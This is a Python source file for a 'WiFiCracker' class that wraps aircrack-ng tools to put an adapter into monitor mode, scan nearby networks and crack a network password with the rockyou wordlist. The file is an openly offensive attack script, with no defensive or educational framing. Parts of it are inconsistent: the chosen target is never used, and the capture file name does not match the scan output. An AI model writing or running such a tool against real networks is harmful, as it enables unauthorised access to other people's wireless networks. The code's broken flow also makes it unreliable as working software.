import subprocess

class WiFiCracker:
    def get_interfaces(self):
        result = subprocess.run(["iwconfig"], capture_output=True, text=True)
        return {"interfaces": result.stdout}

    def set_adapter(self, adapter):
        subprocess.run(["airmon-ng", "check", "kill"], capture_output=True, text=True)
        result = subprocess.run(["airmon-ng", "start", adapter], capture_output=True, text=True)
        return {"status": "Adapter mode changed", "output": result.stdout}

    def scan_networks(self):
        result = subprocess.run(["airodump-ng", "--output-format", "csv", "-w", "scan_results", "wlan0mon"], capture_output=True, text=True)
        return {"status": "Scanning networks", "output": result.stdout}

    def set_target(self, bssid, channel, network_name):
        return {"bssid": bssid, "channel": channel, "network_name": network_name, "status": "Target set"}

    def crack_password(self):
        result = subprocess.run(["aircrack-ng", "-w", "/usr/share/wordlists/rockyou.txt", "scan_results-02.cap"], capture_output=True, text=True)
        return {"status": "Cracking initiated", "output": result.stdout}
